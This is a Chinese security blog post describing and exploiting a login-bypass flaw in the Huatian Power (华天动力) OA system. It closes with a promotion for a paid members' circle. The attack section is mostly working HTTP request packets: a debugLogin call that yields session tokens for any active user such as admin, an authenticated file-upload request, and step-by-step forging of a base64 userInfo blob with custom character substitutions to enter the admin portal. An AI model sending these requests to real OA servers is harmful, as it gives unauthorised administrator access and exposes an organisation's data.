#  华天动力OA登录绕过漏洞利用   
 安全绘景   2024-06-16 20:05  
  
## 0x01 前言  
##   
  
最近有圈内朋友问到了这个系统的登录绕过，说请求之后会返回一个base64字符串，但不知道后续如何利用，随后去看了看放到了圈里，在这里也分享一下吧。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8NlngzLuJZkwEsrVXKIrh3bXibJZU8dYYwq12lRRA0ocE2xjpfEwT1l4bv0mEqMYK71Xq3ZiaqJMWRw/640?wx_fmt=png&from=appmsg "")  
## 0x02 分析与利用       
  
代码比较简单，只检查用户名，只要用户名存在且是激活状态，即可登录成功，所以只需传递code为想要登录的用户名。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8NlngzLuJZkwEsrVXKIrh3bWTsThTgXSL1qiajnOIYJ49bobiaNuKPfuDYrNibibJ3FvowhzuGDaNnrHQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8NlngzLuJZkwEsrVXKIrh3bGLzJRqTlA1YMpEpMKiaYvTJwJLQcqCGr9kdoekl4LrvSKGt8tM5dTzQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8NlngzLuJZkwEsrVXKIrh3biboDRc2dg0v4dpowibszE1wcgyIBic2G0xvELHM2Ku7pntHnZczbxNt9w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8NlngzLuJZkwEsrVXKIrh3b67LqwVpvCSOmyqXhmLAlWvfMcibVYu687czgd6l4PJh61KzjypnruPg/640?wx_fmt=png&from=appmsg "")  
  
最后会返回：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8NlngzLuJZkwEsrVXKIrh3bC1g5CFc3jUm5NmMRnKTIoDnAhNFGzibjT8hQmCStRmyQJ8qX99pCnicg/640?wx_fmt=png&from=appmsg "")  
  
构造请求包：  
```
POST /OAapp/HtEntranceService.do HTTP/1.1
Host: xxx
Content-Length: 64
Pragma: no-cache
Content-Security-Policy: default-src 'self'; script-src 'self'; frame-ancestors 'self'; object-src 'none'
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
X-Content-Type-Options: nosniff
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/plain, */*
Cache-Control: no-cache
X-XSS-Protection: 1
Origin: http://xxx
Referer: http://xxx/OAapp/htpages/app/module/login/8.0Login.jsp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"service":"debugService","method":"debugLogin","code":"admin"}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8NlngzLuJZkwEsrVXKIrh3bbw8Bu5r1Xicibiaf7fyQKddJCIs0CFOKtNjZF8IKAcqFibaNeonicv6HF8A/640?wx_fmt=png&from=appmsg "")  
  
解密后数据如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8NlngzLuJZkwEsrVXKIrh3bY74hhqdWg4LWmL6RKzVm6mvuPC0TcHAyECzvm5Qw4ibaAfB83zvgZRQ/640?wx_fmt=png&from=appmsg "")  
  
看了看发现这个系统是直接通过传递参数来校验登录状态的，其中randomCode就是重要凭据。接下来提供两种方法，  
第  
一种是请求指定接口，第二种是登录后台  
。  
  
第一种：  
直接传递参数，请求需要登陆后的接口，参数如何传递需要看对应接口的接收方式，以下提供参考。  
```
替换code与userShowId，修改params。

POST /OAapp/HtEntranceService.do HTTP/1.1
Host: xxx
Content-Length: 176
Pragma: no-cache
Content-Security-Policy: default-src 'self'; script-src 'self'; frame-ancestors 'self'; object-src 'none'
Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
X-Content-Type-Options: nosniff
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/plain, */*
Cache-Control: no-cache
X-XSS-Protection: 1
Origin: http://xxx
Referer: http://xxx/OAapp/htpages/app/module/portal_FLOW/view/8.0MainPor.jsp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: OA_USER_SHOW_ID=admin; OA_USER_KEY=ebb3d4f06b71442facf28c07805c6a70
Connection: close

{"userId":"admin","code":"IM_52ae810f362f412d818f68248ce7c1fe","params":[{"serviceName":"commService","methodName":"getUserFunctionDictForMenuList","params":"WycnXQx7x;x7x;"}]}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8NlngzLuJZkwEsrVXKIrh3b54Jia0DVMXWKJNvV9zibhtTEydXgGJvUj6lZN8JqvQVZj8e0KQTUKldA/640?wx_fmt=png&from=appmsg "")  
```
替换token与userShowId

POST /OAapp/jsp/editoruploadfile.jsp HTTP/1.1
Host: xxx
Content-Length: 429
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryarQUT0ifqOXqkZdE
Origin: http://xxx
Referer: http://xxx/OAapp/htpages/app/module/portal_FLOW/view/8.0MainPor.jsp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryarQUT0ifqOXqkZdE
Content-Disposition: form-data; name="ajaxTaskFile"; filename="1111.png"
Content-Type: image/png

1111111111111
------WebKitFormBoundaryarQUT0ifqOXqkZdE
Content-Disposition: form-data; name="token"

IM_0c9308b00087459791e97d7e8eec2bb8
------WebKitFormBoundaryarQUT0ifqOXqkZdE
Content-Disposition: form-data; name="userShowId"

admin
------WebKitFormBoundaryarQUT0ifqOXqkZdE--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8NlngzLuJZkwEsrVXKIrh3btesPDEBViaZyxeyjyJpD4Voaia3eOTAUFsbC47ClhicIDBgHAFrs3K48Q/640?wx_fmt=png&from=appmsg "")  
  
第二种：  
  
这里需要注意传递的  
userInfo参数需要base64且需要替换"+"为"  
x6x;  
"，"  
=  
"为"  
x7x;  
"。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8NlngzLuJZkwEsrVXKIrh3biaE8RL4vO2r4tZFRJibl8560Cy58Z3k4Vx7YYEK87hf7gNmJlGicsnoTQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8NlngzLuJZkwEsrVXKIrh3bfNNxeCTcLQiciavk43ep5mx93VO5OCrqdfSD8a8tGd1mJkp46XetKXrg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8NlngzLuJZkwEsrVXKIrh3bOhsZFRpvE3MowdoYSdvshxeic7Kb4brpwkIchNxt2fia3KiaICNBrUcvw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8NlngzLuJZkwEsrVXKIrh3bq5ST3e7ib3L7Ulwf816KXGNLkn0ibia3eTU42KQkEnpuZoViaDJatImLow/640?wx_fmt=png&from=appmsg "")  
  
拦截请求复制如下数据包。（根据下方  
userInfo  
组成  
替换  
userIn  
fo内容  
）  
```
IE：
/OAapp/htpages/app/module/portal_IE8/view/8.0MainPor.jsp

POST /OAapp/htpages/app/module/portal_FLOW/view/8.0MainPor.jsp HTTP/1.1
Host: xxx
Content-Length: 636
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://xxx
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://xxx/OAapp/htpages/app/module/login/8.0Login.jsp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: OA_USER_SHOW_ID=admin; OA_USER_KEY=ebb3d4f06b71442facf28c07805c6a70
Connection: close

userInfo=eyJvdGhlckluZm9Nb2RlbCI6IjExMTEiLCJ1c2VyU2hvd0lkIjoiYWRtaW4iLCJyZWFsVXNlcklkIjoiYWRtaSIsInVzZXJOYW1lIjoi566h55CG5ZGYIiwiZGVwdElkIjoiUk9PVCIsImRlcHROYW1lIjoiMTExMSIsImNvbXBhbnlJZCI6IlJPT1QiLCJjb21wYW55TmFtZSI6IjExMTEiLCJsYW5ndWFnZVR5cGUiOiJDTiIsInNob3dUeXBlIjowLCJjb2RlIjoiSU1fNTJhZTgxMGYzNjJmNDEyZDgxOGY2ODI0OGNlN2MxZmUiLCJyYW5kb21Db2RlIjoiSU1fNTJhZTgxMGYzNjJmNDEyZDgxOGY2ODI0OGNlN2MxZmUiLCJ2ZXJzaW9uVG9rZW4iOiIxMC4yMC0xIiwiZGVidWdGbGciOiIwIiwiY29sb3JTdHlsZSI6IkJMVUUiLCJjdXJyZW50Q3NzUGF0aCI6Ii9PQWFwcC9odHBhZ2VzL2FwcC9jc3MvQ04vcHVibGljLyIsInBvcnRhbFR5cGUiOiJfRkxPVyIsInBpbnlpbiI6ImFkbWluIiwic3VwZXJNYW5hZ2VyRmxnIjpmYWxzZX0x7x;
```  
```
userinfo组成：

{"otherInfoModel":"eyJqc3BUaXRsZSI6IuaIkOWKnyIsImNoYW5nZVBzZEZsZyI6ZmFsc2UsImRlZmF1bHRDb2xvclN0eWxlIjp7InRoZW1lSUQiOiIxMCIsIm5hdmJhckhlYWRlckNvbG9yIjoiYmctZGFya0JsdWUgYmctaGVhZGVyLWRhcmtCbHVlIiwibmF2YmFyQ29sbGFwc2VDb2xvciI6ImJnLWRhcmtCbHVlIiwiYXNpZGVDb2xvciI6ImJnLWxlZnQtZGFya0JsdWUiLCJjb250ZW50Q29sb3IiOiJodC1kYXJrQmx1ZSIsImhlYWRlckZpeGVkIjp0cnVlLCJhc2lkZUZpeGVkIjp0cnVlLCJhc2lkZUZvbGRlZCI6ZmFsc2UsImFzaWRlRG9jayI6ZmFsc2UsIm5vSGVhZENzcyI6IiIsImNvbnRhaW5lciI6ZmFsc2V9fQx7x;x7x;","userShowId":"admin","realUserId":"admi","userName":"管理员","deptId":"ROOT","deptName":"aaa","companyId":"ROOT","companyName":"aaa","languageType":"CN","showType":0,"code":"IM_52ae810f362f412d818f68248ce7c1fe","randomCode":"IM_52ae810f362f412d818f68248ce7c1fe","versionToken":"10.20-1","debugFlg":"0","colorStyle":"BLUE","currentCssPath":"/OAapp/htpages/app/css/CN/public/","portalType":"_FLOW","headPhotoId":"","pinyin":"admin","superManagerFlg":false}

otherInfoModel组成：

{"jspTitle":"成功","changePsdFlg":false,"defaultColorStyle":{"themeID":"1","navbarHeaderColor":" bg-info bg-header-info","navbarCollapseColor":"bg-info","asideColor":"bg-left-info","contentColor":"ht-blue","headerFixed":true,"asideFixed":true,"asideFolded":false,"asideDock":false,"noHeadCss":"","container":false}}

需要替换相关用户名字段(userShowId、realUserId、pinyin)、code、randomcode，以及otherInfoModel中的defaultColorStyle，这些信息在debugLogin请求的响应包base64解密后都能看到。

替换之后需要对otherInfoModel base64编码，替换=为x7x;   +为x6x; 之后替换userinfo中的otherInfoModel。

然后需要对修改后的userinfo整体，base64编码，之后替换=为x7x;    +为x6x;
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8NlngzLuJZkwEsrVXKIrh3blAiaQjJCkNToWCveUxjUicGgs0libzBSZTiavuRQXvImzN5puXJ88Y0BRA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8NlngzLuJZkwEsrVXKIrh3bCLRlFgGcAOuXMzePXPIibGfj5CxM24MSnf88frFgeIRrtBiaGY5ibiaibEw/640?wx_fmt=png&from=appmsg "")  
##   
## 0x03 小密圈‍‍‍‍‍‍‍‍  
## 最后送你一张优惠券，欢迎加入小密圈，好朋友。  
##   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/9zZrDr2DM8NlngzLuJZkwEsrVXKIrh3bnMXEsKeZ9S83kVNGVGjkibB806mepIxvHlibBaNeY1flicPQYfbEylozA/640?wx_fmt=jpeg&from=appmsg "")  
  
